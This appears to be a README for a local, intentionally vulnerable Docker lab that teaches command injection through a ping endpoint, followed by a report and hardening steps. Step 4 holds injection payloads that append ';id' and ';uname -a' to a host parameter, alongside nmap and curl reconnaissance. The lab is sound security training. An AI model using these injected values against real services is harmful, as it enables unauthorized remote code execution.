### Scenario vulnerability lab: command injection (Docker)

#### Important
This lab is intentionally vulnerable. Run only locally.

#### Run
1) docker compose up --build -d
2) docker exec -it vuln-attacker sh

#### Step 1: discovery (scan)
Inside attacker:
- nmap -p 1-10000 vuln-target

Expected: port 8080 open

#### Step 2: enumeration (identify service)
- curl -i http://vuln-target:8080/

#### Step 3: normal use
- curl "http://vuln-target:8080/ping?host=127.0.0.1"

#### Step 4: exploit (command injection)
Because the target uses shell command concatenation, try:
- curl "http://vuln-target:8080/ping?host=127.0.0.1;id"
- curl "http://vuln-target:8080/ping?host=127.0.0.1;uname -a"

You should see command output appended in response.

#### Step 5: write a minimal report
- asset: vulnerable endpoint: /ping
- vulnerability type: command injection
- impact: remote code execution in container context
- reproduction steps: the curl payloads above
- recommended fix: remove shell execution, validate input

#### Step 6: hardening delta (suggested)
Create a hardened version:
- do not use shell=True or shell command strings
- allowlist hostnames/IP formats
- run as non-root
- remove unused tools from image
- restrict network exposure (no ports if not required)
